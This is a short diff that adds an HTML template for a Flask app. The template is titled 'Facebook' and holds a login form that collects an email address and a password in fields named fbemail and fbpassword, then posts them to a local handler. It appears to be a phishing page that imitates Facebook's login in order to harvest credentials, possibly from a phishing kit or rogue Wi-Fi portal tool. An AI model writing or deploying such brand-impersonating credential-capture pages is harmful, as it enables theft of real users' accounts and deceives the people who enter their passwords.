@@ -1,1 +1,17 @@
-
+<!DOCTYPE html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Facebook</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='facebook.css') }}">
+</head>
+<body>
+  <form class="login" action="facebook_login.html" method="POST">
+    <h1>Facebook</h1>
+    <input type="email" name="fbemail" class="login-input" placeholder="Email Address" autofocus>
+    <input type="password" name="fbpassword" class="login-input" placeholder="Password">
+    <input type="submit" value="Login" class="login-submit">
+    <p class="login-help"><a href="#">Forgot password?</a></p>
+  </form>
+</body>
+</html>
